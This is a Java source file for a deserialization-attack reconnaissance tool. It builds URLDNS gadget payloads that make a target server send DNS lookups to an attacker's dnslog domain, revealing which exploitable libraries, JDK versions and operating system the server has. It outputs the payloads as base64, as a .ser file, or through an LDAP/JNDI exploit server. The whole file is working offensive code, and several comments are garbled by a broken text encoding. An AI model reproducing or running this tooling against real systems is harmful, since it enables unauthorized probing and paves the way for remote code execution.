package main;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import javassist.ClassPool;
import javassist.CtClass;


public class en {
	static List<Object> list = new LinkedList<Object>();
	static String dnslog;
	static String[] defaultclass = {
			"CommonsCollections13567",
				"CommonsCollections24",
				"CommonsBeanutils2",
				"C3P0",
				"AspectJWeaver",
				"bsh",
				"Groovy",
				"Becl",
				"DefiningClassLoader",
				"Jdk7u21",
				"JRE8u20",
				"ROME",
				"Fastjson",
				"Jackson",
				"SpringAOP",
				"winlinux"
  				};
	static String[] jndidefaultclass = {
			"org.apache.naming.factory.BeanFactory",
			"javax.el.ELProcessor",
			//"groovy.lang.GroovyShell",//��Groovy���Կ���ʡ����
			//"groovy.lang.GroovyClassLoader",//��Groovy���Կ���ʡ����
			"org.yaml.snakeyaml.Yaml",
			"com.thoughtworks.xstream.XStream",
			//"org.xmlpull.v1.XmlPullParserException",//XStream����
			//"org.xmlpull.mxp1.MXParser",//XStream����
			"org.mvel2.sh.ShellSession",
			//"com.sun.glass.utils.NativeLibLoader",//jdkĬ�Ͼ���
			"org.apache.catalina.UserDatabase",
			"org.apache.catalina.users.MemoryUserDatabaseFactory",
			"org.h2.Driver",
			"org.postgresql.Driver",
			"org.springframework.context.support.ClassPathXmlApplicationContext",//postgresql RCE����spring����
			"com.mysql.jdbc.Driver",
			"com.mysql.cj.jdbc.Driver",
			"com.mysql.fabric.jdbc.FabricMySQLDriver",
			"oracle.jdbc.driver.OracleDriver",
			"org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",
			"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
			"org.apache.commons.dbcp.BasicDataSourceFactory",
			//"org.apache.commons.pool.KeyedObjectPoolFactory",//commons-dbcp1����
			"org.apache.commons.dbcp2.BasicDataSourceFactory",
			//"org.apache.commons.pool2.PooledObjectFactory",//commons-dbcp2����
			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
			//"org.apache.juli.logging.LogFactory",//tomcat-jdbc����
			"com.alibaba.druid.pool.DruidDataSourceFactory",
			"com.zaxxer.hikari.HikariJNDIFactory",
			//"org.slf4j.LoggerFactory",//HikariCP����
			"com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",
			"com.ibm.ws.webservices.engine.client.ServiceFactory"
			};
	
	
    public static void main(String act, String clazzs, String dns) throws Exception {
  		dnslog = dns;
  		List arraylistclazz = Arrays.asList(clazzs.split("\\|"));

  		if(act.equals("base64")) {
  	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  				String clazz = (String) iterator.next();
  				setlist(clazz);
  			}
  	        ByteArrayOutputStream out = new ByteArrayOutputStream();
  	        ObjectOutputStream os = new ObjectOutputStream(out);
  	        os.writeObject(list);
  	        String base64 = java.util.Base64.getEncoder().encodeToString(out.toByteArray());
  	        System.out.println(base64);
  	        
  		}else if(act.equals("file")){
  	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  				String clazz = (String) iterator.next();
  				setlist(clazz);
  			}
  	    	ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("1.ser"));
  	    	oos.writeObject(list);
		}else if(act.equals("ldap")){
  	  		for (Iterator iterator = arraylistclazz.iterator(); iterator.hasNext();) {
  				String clazz = (String) iterator.next();
  				setlist(clazz);
  			}
  	  		if(arraylistclazz.contains("all")) {
  	  			setlist("jndiall");
  	  		}
  	        ByteArrayOutputStream out = new ByteArrayOutputStream();
  	        ObjectOutputStream os = new ObjectOutputStream(out);
  	        os.writeObject(list);
  	        String base64 = java.util.Base64.getEncoder().encodeToString(out.toByteArray());
  	        ldapexp.main(base64, dnslog);
		}
    }
    
    
    
    public static  void setlist(String clazzName) throws Exception{
    	switch (clazzName) {
		case "CommonsCollections13567":
	    	//CommonsCollections1/3/5/6/7��,��Ҫ<=3.2.1�汾
	    	HashMap cc31or321 = getURLDNSgadget("http://cc31or321."+dnslog, "org.apache.commons.collections.functors.ChainedTransformer");
	    	HashMap cc322 = getURLDNSgadget("http://cc322."+dnslog, "org.apache.commons.collections.ExtendedProperties$1");
	  		list.add(cc31or321);
	  		list.add(cc322);
			break;
		case "CommonsCollections24":
	    	//CommonsCollections2/4��,��Ҫ4-4.0�汾
	    	HashMap cc40 = getURLDNSgadget("http://cc40."+dnslog,  "org.apache.commons.collections4.functors.ChainedTransformer");
	    	HashMap cc41 = getURLDNSgadget("http://cc41."+dnslog,  "org.apache.commons.collections4.FluentIterable");
	  		list.add(cc40);
	  		list.add(cc41);
			break;
		case "CommonsBeanutils2":
	    	//CommonsBeanutils2��,serialVersionUID��ͬ,1.7x-1.8xΪ-3490850999041592962,1.9xΪ-2044202215314119608
			HashMap cb17 = getURLDNSgadget("http://cb17."+dnslog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
	    	HashMap cb18x = getURLDNSgadget("http://cb18x."+dnslog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
	    	HashMap cb19x = getURLDNSgadget("http://cb19x."+dnslog, "org.apache.commons.beanutils.BeanIntrospectionData");
	    	list.add(cb17);
	  		list.add(cb18x);
	  		list.add(cb19x);
			break;
		case "C3P0":
	    	//c3p0��serialVersionUID��ͬ,0.9.2pre2-0.9.5pre8Ϊ7387108436934414104,0.9.5pre9-0.9.5.5Ϊ-2440162180985815128
	    	HashMap c3p092x = getURLDNSgadget("http://c3p092x."+dnslog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
	    	HashMap c3p095x = getURLDNSgadget("http://c3p095x."+dnslog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
	  		list.add(c3p092x);
	  		list.add(c3p095x);
			break;
		case "AspectJWeaver":
	    	//AspectJWeaver,��Ҫcc31
	    	HashMap ajw = getURLDNSgadget("http://ajw."+dnslog, "org.aspectj.weaver.tools.cache.SimpleCache");
	  		list.add(ajw);
			break;
		case "bsh":
	  		//bsh,serialVersionUID��ͬ,2.0b4Ϊ4949939576606791809,2.0b5Ϊ4041428789013517368,2.0.b6�޷������л�
	  		HashMap bsh20b4 = getURLDNSgadget("http://bsh20b4."+dnslog, "bsh.CollectionManager$1");
	  		HashMap bsh20b5 = getURLDNSgadget("http://bsh20b5."+dnslog, "bsh.engine.BshScriptEngine");
	  		HashMap bsh20b6 = getURLDNSgadget("http://bsh20b6."+dnslog, "bsh.collection.CollectionIterator$1");
	  		list.add(bsh20b4);
	  		list.add(bsh20b5);
	  		list.add(bsh20b6);
			break;
		case "Groovy":
	  		//Groovy,1.7.0-2.4.3,serialVersionUID��ͬ,2.4.xΪ-8137949907733646644,2.3.xΪ1228988487386910280
	  		HashMap groovy1702311 = getURLDNSgadget("http://groovy1702311."+dnslog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
	  		HashMap groovy24x = getURLDNSgadget("http://groovy24x."+dnslog, "groovy.lang.Tuple2");
	  		HashMap groovy244 = getURLDNSgadget("http://groovy244."+dnslog, "org.codehaus.groovy.runtime.dgm$1170");
	  		list.add(groovy1702311);
	  		list.add(groovy24x);
	  		list.add(groovy244);
			break;
		case "Becl":
	  		//Becl,JDK<8u251
	  		HashMap becl = getURLDNSgadget("http://becl."+dnslog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
	  		list.add(becl);
			break;
		case "DefiningClassLoader":
	  		//js-14.jar
	  		HashMap js = getURLDNSgadget("http://DefiningClassLoader."+dnslog, "org.mozilla.javascript.DefiningClassLoader");
	  		list.add(js);
			break;
		case "Jdk7u21":
	  		//JDK<=7u21
	  		HashMap Jdk7u21 = getURLDNSgadget("http://Jdk7u21."+dnslog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
	  		list.add(Jdk7u21);
			break;
		case "JRE8u20":
	  		//7u25<=JDK<=8u20,��Ȼ��JRE8u20��ʵJDK8u20Ҳ����,�����ⲻ����,8u25�汾�Լ�JDK<=7u21����,���ۺ�Jdk7u21����
	  		HashMap JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
	  		list.add(JRE8u20);
			break;
		case "ROME":
			//rome <= 1.11.1
			HashMap rome1000 = getURLDNSgadget("http://rome1000."+dnslog, "com.sun.syndication.feed.impl.ToStringBean");
			HashMap rome1111 = getURLDNSgadget("http://rome1111."+dnslog, "com.rometools.rome.feed.impl.ObjectBean");
	  		list.add(rome1000);
	  		list.add(rome1111);
			break;
		case "Fastjson":
			//fastjson<=1248����һ����,ȫ�汾��Ҫ��hashMap�ƹ�checkAutoType
			//��������BadAttributeValueExpException,��JDK1.7���޷�ʹ��.��ʱ��Ҫ��springAOP�ƹ�
			HashMap fastjson = getURLDNSgadget("http://fastjson."+dnslog, "com.alibaba.fastjson.JSONArray");
	  		list.add(fastjson);
			break;
		case "Jackson":
			//jackson-databind>=2.10.0����һ����
			HashMap jackson = getURLDNSgadget("http://jackson2100."+dnslog, "com.fasterxml.jackson.databind.node.NodeSerialization");
	  		list.add(jackson);
			break;
		case "SpringAOP":
			//fastjon/jackson�������ı��ֶ���ҪspringAOP
			HashMap springAOP = getURLDNSgadget("http://SpringAOP."+dnslog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
	  		list.add(springAOP);
			break;
		case "winlinux":
	  		//windows/linux�汾�ж�
	  		HashMap linux = getURLDNSgadget("http://linux."+dnslog, "sun.awt.X11.AwtGraphicsConfigData");
	  		HashMap windows = getURLDNSgadget("http://windows."+dnslog, "sun.awt.windows.WButtonPeer");
	  		list.add(linux);
	  		list.add(windows);
			break;
		case "all":
			for (int i = 0; i < defaultclass.length; i++) {
				setlist(defaultclass[i]);
			}
			break;
		case "jndiall":
			for (int i = 0; i < jndidefaultclass.length; i++) {
				setlist(jndidefaultclass[i]);
			}
			break;
		default:
			HashMap hm = getURLDNSgadget("http://"+clazzName.replace(".", "_").replace("$", "_")+"."+dnslog, clazzName);
			list.add(hm);
			break;
		}
    	
    	
    }

    public static HashMap getURLDNSgadget(String urls, String clazzName) throws Exception{
    	HashMap hashMap = new HashMap();
  		URL url = new URL(urls);
  		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
  		f.setAccessible(true);
  		f.set(url, 0);
  		Class clazz = null;
  		try {
  			clazz = makeClass(clazzName);
		} catch (Exception e) {
			clazz = Class.forName(clazzName);
		}
  		hashMap.put(url, clazz);
  		f.set(url, -1);
        return hashMap;
    }
    
    public static Class makeClass(String clazzName) throws Exception{
    	
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }

}
